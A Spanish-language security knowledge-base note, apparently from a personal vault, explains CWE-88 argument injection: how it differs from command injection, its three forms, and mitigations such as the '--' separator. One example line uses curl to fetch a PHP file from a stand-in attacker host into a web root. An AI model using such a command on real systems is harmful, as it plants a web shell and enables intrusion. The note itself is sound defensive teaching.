---
tipo: tecnica
taxonomia: cwe
identificador: CWE-88
wstg: WSTG-INPV-12
tacticas: []
aliases:
  - CWE-88
  - Argument injection
  - Inyección de argumentos
  - parameter injection
tags:
  - dominio/web
---

# CWE-88 - Argument Injection

> [!note] Nota paraguas
> Sin contenido operativo. La decisión vive en [[MOC - Command injection]]; la variante en [[Argument injection - abuso de flags]]; los binarios abusables en [[Argument injection - matriz de referencia]].

## Qué es

El atacante **no** logra escapar del argumento y convertirse en comando, pero sí controla el contenido de ese argumento lo suficiente como para inyectar **flags** que cambian el comportamiento del binario invocado.

`curl <url>` con `url` controlada no es RCE. `curl -o /var/www/html/s.php http://atacante/s.php` sí lo es, y es el mismo comando con el mismo binario.

## Por qué existe separada de CWE-78

Porque sobrevive a la mitigación de CWE-78. Una app que usa `execve()` con array de argumentos, o `escapeshellarg()` sobre cada parámetro, está correctamente blindada contra inyección de comandos y sigue siendo vulnerable acá: el argumento llega intacto al binario, y eso es precisamente el problema.

Es la razón por la que las dos CWE comparten MOC: **la pregunta "¿hay shell?" separa cuál de las dos aplica**, y esa pregunta es el nodo raíz del árbol de decisión, no un detalle de implementación.

## Las tres formas

- **Flag inyectada** — el input arranca con `-` o `--` y el binario lo lee como opción. Depende de que el argumento controlado vaya antes del separador `--`, o de que no haya separador.
- **Separador de argumentos** — el input contiene espacios sin comillar y se parte en varios argumentos.
- **Valor con semántica** — el argumento no es una flag pero el binario le da significado especial: `@archivo` en `curl`, `--` en `git`, rutas que empiezan con `-` en `tar`.

## Mitigación real

Anteponer `--` para cerrar la lista de opciones (donde el binario lo soporte), y validar que el argumento no empiece con `-`. Comillar no alcanza: `escapeshellarg('-o /tmp/x')` produce un argumento perfectamente escapado que sigue siendo la flag `-o`.

## Referencias canónicas

- [CWE-88](https://cwe.mitre.org/data/definitions/88.html)
- WSTG-INPV-12
- [GTFOArgs](https://gtfoargs.github.io/)
